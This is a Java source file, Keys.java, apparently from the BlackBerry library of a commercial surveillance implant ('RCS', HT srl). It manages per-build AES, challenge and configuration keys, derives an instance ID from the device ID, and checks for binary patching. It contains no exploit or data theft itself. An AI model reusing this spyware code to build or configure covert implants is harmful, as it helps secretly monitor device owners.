//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Keys.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.config;

import net.rim.device.api.system.RuntimeStore;
import blackberry.Device;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;

/**
 * The Class Keys.
 */
public final class Keys implements Singleton {

    //#ifdef DEBUG
    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
    //#endif

    InstanceKeys instanceKeys;

    static private Keys instance = null;
    private static final long GUID = 0x6b3d91c714d645e7L;

    /*
     * private static byte[] byteAesKey; private static byte[] byteChallengeKey;
     * private static byte[] byteConfKey; private static byte[] byteBuildID;
     */
    private static byte[] byteInstanceID;

    //#ifdef DEBUG
    public String log = "";

    //#endif

    /**
     * Gets the single instance of Keys.
     * 
     * @return single instance of Keys
     */
    public static synchronized Keys getInstance(
            InstanceKeysEmbedded instanceKeyEmbedded) {
        if (instance == null) {

            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final Keys singleton = new Keys();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        //#ifdef FAKECONF
        if (instanceKeyEmbedded != null) {
            instance.setInstanceKeys(instanceKeyEmbedded);
        }
        //#endif

        //#ifdef DBC
        Check.ensures(instance.getAesKey() != null, "Null AESKEY");
        //#endif
        
        return instance;
    }

    public static synchronized Keys getInstance() {
        return getInstance(null);
    }

    public static synchronized boolean isInstanced() {
        return (instance != null);
    }

    /**
     * Checks for been binary patched.
     * 
     * @return true, if successful
     */
    public boolean hasBeenBinaryPatched() {
        return instanceKeys.hasBeenBinaryPatched();
    }

    private Keys() {
        final Device device = Device.getInstance();
        //device.refreshData();
        final byte[] deviceid = device.getWDeviceId();
        byteInstanceID = Encryption.SHA1(deviceid);
    }

    private void setInstanceKeys(InstanceKeysEmbedded instance) {
        instanceKeys = new InstanceKeys();
        //#ifdef FAKECONF
        if (!hasBeenBinaryPatched()) {
            if (instance != null) {
                instance.injectKeys(instanceKeys);
            }
        }
        //#endif  
    }

    /*
     * private void setInstanceKeys() { byteAesKey = instanceKeys.getAesKey();
     * byteChallengeKey = instanceKeys.getChallengeKey(); byteConfKey =
     * instanceKeys.getConfKey(); byteBuildID = instanceKeys.getBuildId();
     * //#ifdef DEBUG debug.trace("instanceKeys log:" + InstanceKeys.log);
     * //#endif }
     */

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getAesKey() {
        return instanceKeys.getAesKey();

    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildId() {
        return instanceKeys.getBuildId();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getChallengeKey() {
        return instanceKeys.getChallengeKey();
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return instanceKeys.getConfKey();
    }

    /**
     * Gets the instance id.
     * 
     * @return the instance id
     */
    public byte[] getInstanceId() {
        return byteInstanceID;
    }

}